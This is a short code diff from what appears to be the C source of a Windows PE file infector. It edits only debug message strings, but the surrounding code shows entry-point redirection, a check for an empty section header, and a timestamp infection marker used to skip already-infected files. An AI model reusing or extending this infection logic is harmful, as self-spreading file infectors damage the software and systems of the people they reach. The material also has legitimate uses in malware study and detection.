@@ -90,7 +90,7 @@ static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers, uint32_t entry_offse
     uint32_t oep = nt_headers->OptionalHeader.ImageBase +
                    nt_headers->OptionalHeader.AddressOfEntryPoint;
     if (write_original_entry_point(oep, target_code_begin) != 0) {
-        PRINT_DEBUG("could not save original entry point\n");
+        PRINT_DEBUG("could not save original entry point");
     }
 
     IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
@@ -103,12 +103,12 @@ static int can_infect(const char *filename, data_t *data) {
     memzero(&fw, sizeof(file_view_t));
 
     if (open_file_view(filename, &fw, data) != 0) {
-        PRINT_DEBUG("can't infect \"%s\": could not open file\n", filename);
+        PRINT_DEBUG("can't infect \"%s\": could not open file", filename);
         return 0;
     }
 
     if (!is_pe(fw.start_address)) {
-        PRINT_DEBUG("can't infect \"%s\": no valid pe\n", filename);
+        PRINT_DEBUG("can't infect \"%s\": no valid pe", filename);
         close_file_view(&fw, data);
         return 0;
     }
@@ -118,13 +118,13 @@ static int can_infect(const char *filename, data_t *data) {
         get_section_header(nt_headers, nt_headers->FileHeader.NumberOfSections);
 
     if (!is_section_header_empty(section_header)) {
-        PRINT_DEBUG("can't infect \"%s\": no additional empty section header\n",
+        PRINT_DEBUG("can't infect \"%s\": no additional empty section header",
                     filename);
         close_file_view(&fw, data);
         return 0;
     }
     if (nt_headers->FileHeader.TimeDateStamp == INFECTION_MARKER) {
-        PRINT_DEBUG("can't infect \"%s\": already infected\n", filename);
+        PRINT_DEBUG("can't infect \"%s\": already infected", filename);
         close_file_view(&fw, data);
         return 0;
     }
@@ -136,7 +136,7 @@ static uint32_t get_extended_file_size(const char *filename, data_t *data) {
     memzero(&fw, sizeof(file_view_t));
 
     if (open_file_view(filename, &fw, data) != 0) {
-        PRINT_DEBUG("could not open view of file\n");
+        PRINT_DEBUG("could not open view of file");
         return 0;
     }
     IMAGE_NT_HEADERS *nt_headers = get_nt_header(fw.start_address);
